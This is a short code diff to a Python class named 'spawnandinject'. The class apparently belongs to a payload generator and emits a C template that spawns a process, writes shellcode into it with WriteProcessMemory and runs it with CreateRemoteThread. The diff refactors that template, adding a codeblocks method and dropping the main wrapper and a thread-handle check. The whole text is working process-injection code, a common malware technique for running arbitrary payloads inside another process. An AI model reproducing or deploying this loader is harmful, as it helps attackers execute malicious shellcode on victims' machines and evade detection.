@@ -20,16 +20,12 @@ class spawnandinject:
 
     def compilerOptions(self) -> list[str]:
         return []
+    
+    def codeblocks(self) -> str:
+        return """"""
 
     def template(self) -> str:
         return Template("""
-{imports}
-
-{codeblocks}
-
-int main()
-{{
-    
     {transformers}
     
     STARTUPINFOA si = {{
@@ -53,12 +49,6 @@ int main()
     WriteProcessMemory(pi.hProcess, pRemoteCode, (PVOID)shellcode, (SIZE_T){shellcodeSize}, (SIZE_T *)NULL);
     
     hThread = CreateRemoteThread(pi.hProcess, NULL, 0, pRemoteCode, NULL, 0, NULL);
-    if (hThread != NULL) {{
-        WaitForSingleObject(hThread, 500);
-        CloseHandle(hThread);
-        return 0;
-    }}
-
-    return 0;
-}}
+    WaitForSingleObject(hThread, 500);
+    CloseHandle(hThread);
 """).substitute(target=self.target, memoryPermission=self.memoryPermission)
